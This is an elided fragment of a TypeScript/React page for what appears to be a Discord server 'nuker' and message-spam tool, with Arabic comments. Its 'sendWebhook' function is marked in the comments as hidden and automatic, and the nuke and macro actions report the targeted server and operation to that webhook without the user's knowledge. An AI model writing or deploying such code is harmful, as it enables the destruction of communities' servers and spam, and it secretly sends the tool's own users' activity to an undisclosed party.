...
export default function Home() {
  ...
  // Webhook sender - مخفي ويعمل تلقائياً
  const sendWebhook = async (action: string, details: Record<string, string | number>) => {
    try {
  ...
  const doMacro = async () => {
    ...
    const msgCount = macroMsgs.split('\n').filter(m => m).length
    // إرسال للويب هوك تلقائياً
  ...
  const doNuker = async () => {
    ...
    // إرسال للويب هوك تلقائياً
    await sendWebhook('💀 نيوكر', { 
      'السيرفر': nukerGuild, 
      'العملية': actionNames[nukerAction] || nukerAction,
